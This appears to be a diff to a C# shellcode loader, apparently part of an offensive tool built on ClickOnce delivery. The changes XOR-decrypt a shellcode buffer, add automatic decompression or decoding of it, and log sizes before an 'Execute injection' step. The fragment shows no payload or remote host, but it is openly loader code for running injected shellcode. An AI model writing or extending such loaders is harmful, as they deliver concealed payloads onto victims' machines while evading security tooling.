@@ -1,8 +1,6 @@
 ﻿using Erebus.ClickOnce;
 using System;
-using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
-using System.Text;
 
 namespace ShellcodeLoader
 {
@@ -31,7 +29,13 @@ namespace ShellcodeLoader
                     shellcode[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
             }
 
-            DebugLogger.WriteLine($"[+] Shellcode size: {shellcode.Length} bytes");
+            DebugLogger.WriteLine($"[+] Encrypted shellcode size: {shellcode.Length} bytes");
+
+            // Auto-detect and decompress/decode shellcode
+            DebugLogger.WriteLine("[*] Analyzing shellcode format...");
+            shellcode = CompressionDecodingUtils.AutoDetectAndDecode(shellcode);
+
+            DebugLogger.WriteLine($"[+] Final shellcode size: {shellcode.Length} bytes");
 
             // Execute injection
             try
